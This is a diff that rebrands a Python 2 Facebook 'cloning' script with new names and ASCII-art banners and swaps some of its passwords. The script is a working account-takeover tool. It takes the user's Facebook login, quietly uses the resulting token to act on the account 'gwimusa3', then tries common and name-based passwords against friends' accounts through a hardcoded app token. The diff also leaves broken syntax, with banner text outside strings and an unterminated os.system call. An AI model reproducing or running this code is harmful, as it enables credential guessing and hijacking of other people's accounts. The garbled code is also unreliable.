@@ -1,6 +1,6 @@
 #!/usr/bin/python2
 #coding=utf-8
-#The Credit For This Code Goes To RanaAahil
+#The Credit For This Code Goes To UpilKoclok
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
 #Reserved2020
 
@@ -51,19 +51,21 @@ def jalan(z):
 #Dev:love_hacker
 ##### LOGO #####
 logo = """
-       \033[1;91m:▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒:
-      \033[1;92m▒▒▒▒▒▒▒▒█▒█▒█▒▒▒█▒█▒█▒▒▒▒▒▒▒▒▒▒::     
-     \033[1;93m:▒▒▒▒▒▒███▒█▒█▒███▒█▒█▒▒▒▒▒▒▒▒▒▒:::      
-    \033[1;94m::▒▒▒▒▒▒█▒▒▒█▒█▒█▒▒▒█▒█▒▒▒▒▒▒▒▒▒▒::::      
-   \033[1;95m:::▒▒▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒:::::         
-  \033[1;96m::♧♧♧♧♧♧♧♧♧♧\033[1;91mWhatsapp\033[1;96m♧♧♧♧♧♧♧♧♧♧▒▒▒▒▒▒▒::::        
-  \033[1;91m:》》》\033[1;93m+NE-DENA\033[1;91m《《《▒▒▒▒▒▒▒▒▒▒▒:::::
-\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96m-RanaAhil-\033[1;95m♡╭──────────•◈•──────────╮♡
-\033[1;92m..........................Aahilcreations......................
-\033[1;93m╔╗ ╔╗╔═╦╦╦═╗ ╔╗╔╦═╦╦╗
-\033[1;93m║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║   Rana Aahil
-\033[1;93m╚╝ ╚═╩═╩═╩═╝═ ╚╝╚═╩═╝ 
-\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mRanAhil\033[1;95m♡╰──────────•◈•──────────╯♡"""
+       
+    
+  ╔════•ೋೋ•════╗ 
+          UPIL KOCLOK
+╚════•ೋೋ•════╝
+
+
+      
+
+
+
+
+
+
+
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -82,30 +84,64 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print  """
-  \033[1;96m-┈┈┈┈┈┈┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈┈         
-  \033[1;96m┈┈┈┈┈┈┈┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈┈┈┈        
-  \033[1;96m┈┈┈┈┈┈┈┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈┈┈┈   
- \033[1;96m ┈┈┈┈┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈┈┈   
- \033[1;96m ┈┈┈┈┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈
- \033[1;96m ┈┈┈┈┈┈┈┈╱▔▔▔▔┊┊┊┊▔▔▔▔╲┈┈┈┈
-  \033[1;96m ─────────────•◈•──────────  
-   \033[1;92m███████▒▒Welcome To AAHIL CREATIONS▒▒████████
-\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96mRanAhil\033[1;95m♡╭──────────•◈•──────────╮♡
-\033[1;94mAuthor\033[1;91m: \033[1;91mAcreations
-\033[1;94mRanaAhil\033[1;91m: \033[1;91▒▓██████████████]99.9
-\033[1;94mFacebook\033[1;91m: \033[1;91mAcreations
-\033[1;94mWhatsapp\033[1;91m: \033[1;91m NE-DENA
-\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mRanAhil\033[1;95m♡╰──────────•◈•──────────╯♡"""
-jalan('              \033[1;96m....................RanaAhil.....................:')
-jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈┈┈┈   ")
-jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈┈┈┈   ')
-jalan('\033[1;93m   ┈┈┈┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈┈┈┈   ')
-jalan("\033[1;93m   ┈┈┈┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈┈┈┈ ")
-jalan("\033[1;93m   ┈┈┈┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈┈┈┈")
-print "\033[1;93m♡─────╱▔▔▔▔┊┊┊┊▔▔▔▔╲───────♡\033[1;96mLogin RanaAhil\033[1;95m♡╰──────────•◈•──────────╯♡"
+  \033[1;96m
+▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
+▒▒█▒▒▒▄██████████▄▒▒▒▒
+▒█▐▒▒▒████████████▒▒▒▒
+▒▌▐▒▒██▄▀██████▀▄██▒▒▒
+▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
+▐┼▐▒▒██████████████▒▒▒
+▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
+▒▒█████──────────▐███▌
+▒▒█▀▀██▄█─▄───▐─▄███▀▒
+▒▒█▒▒███████▄██████▒▒▒
+▒▒▒▒▒██████████████▒▒▒
+▒▒▒▒▒██████████████▒▒▒
+▒▒▒▒▒█████████▐▌██▌▒▒▒
+▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
+▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒       
 
-CorrectUsername = "rana"
-CorrectPassword = "rana"
+ 
+
+
+
+
+  
+   \033[1;92m███████Welcome To UPIL KOCLOK ████████
+	
+"================================================================="
+\033[1;94mAuthor\033[1;91m: \033[1;91mAcreations
+\033[1;94mUpilkoclok\033[1;91m: \033[1;91▒▓██████████████]99.9
+\033[1;94mFacebook\033[1;91m: \033[1;91mAcreations
+\033[1;94mWhatsapp\033[1;91m: \033[1;91m 
+"=================================================================="
+jalan('              \033[1;96m....................Upilkoclok.....................:')
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
+▒▒█▒▒▒▄██████████▄▒▒▒▒
+▒█▐▒▒▒████████████▒▒▒▒
+▒▌▐▒▒██▄▀██████▀▄██▒▒▒
+▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
+▐┼▐▒▒██████████████▒▒▒
+▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
+▒▒█████──────────▐███▌
+▒▒█▀▀██▄█─▄───▐─▄███▀▒
+▒▒█▒▒███████▄██████▒▒▒
+▒▒▒▒▒██████████████▒▒▒
+▒▒▒▒▒██████████████▒▒▒
+▒▒▒▒▒█████████▐▌██▌▒▒▒
+▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
+▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+
+
+
+
+print "
+
+CorrectUsername = "upil"
+CorrectPassword = "kocl"
 
 loop = 'true'
 while (loop == 'true'):
@@ -118,10 +154,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;91mWrong Password"
-            os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+            os.system('xdg-open 085800575938')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+        os.system('xdg-open 085800575938')
 
 def login():
 	os.system('clear')
@@ -133,7 +169,7 @@ def login():
 		print logo
 		jalan(' \033[1;92mWarning: \033[1;97mDo Not Use Your Personal Account' )
 		jalan(' \033[1;92m   Note: \033[1;97mUse a New Account To Login' )
-		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mRanaAhil\033[1;95m♡──────────•◈•──────────♡"
+		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mUpilkoclok\033[1;95m♡──────────•◈•──────────♡"
 		print('	   \033[1;94m♡\x1b[1;91m》》》》》》LOGIN WITH FACEBOOK《《《《《《\x1b[1;94m♡' )
 		print('	' )
 		id = raw_input('\033[1;96m[+] \x1b[1;92mID/Email\x1b[1;95m: \x1b[1;96m')
@@ -165,7 +201,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;95mLogin Successful...'
-				os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+				os.system('xdg-open 085800575938
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -212,7 +248,7 @@ def menu():
 	print "  \033[1;95m«-----♡----\033[1;93mLogged in User Info\033[1;95m----♡-----»"
 	print "	   \033[1;94m Name\033[1;93m:\033[1;92m"+nama+"\033[1;97m               "
 	print "	   \033[1;97m ID\033[1;93m:\033[1;92m"+id+"\x1b[1;97m              "
-	print "\033[1;95m♡─────────•◈•─────────♡\033[1;96mRanAhil\033[1;95m♡─────────•◈•─────────♡"
+	print "\033[1;95m♡─────────•◈•─────────♡\033[1;96mUpilkoclok\033[1;95m♡─────────•◈•─────────♡"
 	print "\033[1;97m--\033[1;92m> \033[1;92m1.\x1b[1;92mStart Cloning..."
 	print "\033[1;97m--\033[1;91m> \033[1;91m0.\033[1;91mExit            "
 	pilih()
@@ -295,9 +331,9 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;91mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;94m«-----\x1b[1;93m♡To Stop Process Press CTRL+Z♡\033[1;94m----»"
-	print "\033[1;95m♡─────────•◈•─────────♡\033[1;96mRanaAhil\033[1;95m♡─────────•◈•─────────♡"
+	print "\033[1;95m♡─────────•◈•─────────♡\033[1;96mUpilkoclok\033[1;95m♡─────────•◈•─────────♡"
 	jalan(' \033[1;93m ........Cloning Start plzzz Wait.......... ')
-	print "\033[1;95m♡─────────•◈•─────────♡\033[1;96mRanaAhil\033[1;95m♡─────────•◈•─────────♡"
+	print "\033[1;95m♡─────────•◈•─────────♡\033[1;96mUpilkoclok\033[1;95m♡─────────•◈•─────────♡"
 	
 			
 	def main(arg):
@@ -310,7 +346,7 @@ def pilih_super():
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
-			pass1 = ('786786')
+			pass1 = ('123456')
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			q = json.load(data)
 			if 'access_token' in q:
@@ -324,7 +360,7 @@ def pilih_super():
 					cek.close()
 					cekpoint.append(user+pass1)
 				else:
-					pass2 = 'Pakistan'
+					pass2 = 'qwerty'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
 					if 'access_token' in q:
@@ -380,7 +416,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = b['first_name'] + '786'
+													pass6 = b['first_name'] + 'catholic'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -396,7 +432,7 @@ def pilih_super():
 														else:
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
-															pass7 = b['first_name'] + 'pak123'
+															pass7 = 'london'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
@@ -427,10 +463,10 @@ def pilih_super():
              [███████████████]
              ◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤
 ♡──────────────•◈•──────────────♡.
-: \033[1;96m .....Aahil  Creations........... \033[1;93m :
+: \033[1;96m .....Upil  Creations........... \033[1;93m :
 ♡──────────────•◈•──────────────♡.' 
-                whatsapp Num
-               +NI DENA """
+     
+    
 	
 	raw_input("\n\033[1;92m[\033[1;94mBack\033[1;96m]")
 	menu()
